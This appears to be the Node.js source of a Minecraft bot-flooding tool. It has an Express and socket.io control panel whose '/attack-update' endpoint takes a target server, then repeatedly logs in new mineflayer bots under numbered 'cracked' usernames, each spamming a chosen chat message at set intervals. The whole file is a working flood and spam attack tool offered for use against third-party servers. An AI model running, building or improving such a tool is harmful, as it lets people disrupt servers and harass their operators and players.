const snekfetch = require("snekfetch")
const config = require("./config.json")
const express = require('express')
var bodyParser = require('body-parser')
const app = express()
const http = require('http').createServer(app)
require('child_process').exec("start http://localhost:3000");
var io = require('socket.io')(http);

try {
  app.use(bodyParser.json());
  app.use(bodyParser.urlencoded({ extended: true }));
  app.use(express.json());
  app.use(express.static(__dirname + '/public'));
  app.get('/', function (req, res) {
    res.sendFile(__dirname +"/index.html")
  })
  app.get('/logs', function (req, res) {
    res.sendFile(__dirname +"/public/logs.html")
  })
  app.get('/chat', function (req, res) {
    res.sendFile(__dirname +"/public/chat.html")
  })
  console.clear()


  function time(){
    let date_ob = new Date();
    let hours = date_ob.getHours();

  // current minutes
  let minutes = date_ob.getMinutes();

  // current seconds
  let seconds = date_ob.getSeconds();

  let timee = hours +' : '+minutes +' : '+ seconds
    return timee;
  }

  let spam = false
  let spamlogs = false
  let number = 100
  let last_msg = ""



  http.listen(3000, function (err) {
    if (err) return console.error(err);
    console.log('website Connected')


  })

  io.on('connection', function(socket){

    app.post("/attack-update",(req,res)=>{
      snekfetch.get(`https://api.mcsrvstat.us/2/${req.body.ipp}`).then(n => {
        config.ip = n.body.ip
        config.port = n.body.port
        config.version = n.body.version
        config.spammessage = req.body.spammessage
        config.crackedusernameprefix = req.body.prefixusername
        let checkspam = req.body.checkedspam
            if(req.body.checkedspam) {
          spamlogs = req.body.checkedspam
            }
        let check = req.body.checked
            if(req.body.checked) {
          spam = req.body.checked
            }
            res.redirect('/logs')
            mc()

      })

    })

    function mc() {

        console.log('attack start');
      setInterval(() => {
          number++;

            var mineflayer = require('mineflayer');
            var bot = mineflayer.createBot({
                host: config.ip,
                port: config.port,
                username: config.crackedusernameprefix + number.toString(),
                version: config.version,
            });


            bot.on('chat', (username, message) => {
              if (username === bot.username) return
              if(username.includes(config.crackedusernameprefix))return;
              if(last_msg == message)return;
              last_msg = message
              io.emit('chat msg',`${time()} |   `+ username +' : '+ message);

            })


            bot.on('login', () => {
              if(spam){
                setInterval(() => {
                  if(spamlogs){

                    io.emit('chat message',`${time()} |   `+ bot.username +' : spam sent');
                  }

                  bot.chat(config.spammessage)

                }, config.spamintervalms)
              }
               io.emit('chat message', bot.username +' : login successful ');
            });

            bot.on('kicked', function(reason) {
              var json = JSON.parse(reason);
              try {
                if(json.extra.length){
                  for (var i = 0; i < json.extra.length; i++) {
                    io.emit('chat message', bot.username +' : '+json.extra[i].text);
                    console.log('kick')
                }
                }else{
                  console.log('kick')
                  io.emit('chat message', bot.username +' : '+json.extra.text);

                }

              } catch (e) {
              }


            });
      }, config.loginintervalms)

    }

  })

} catch (e) {
console.log(e);
}
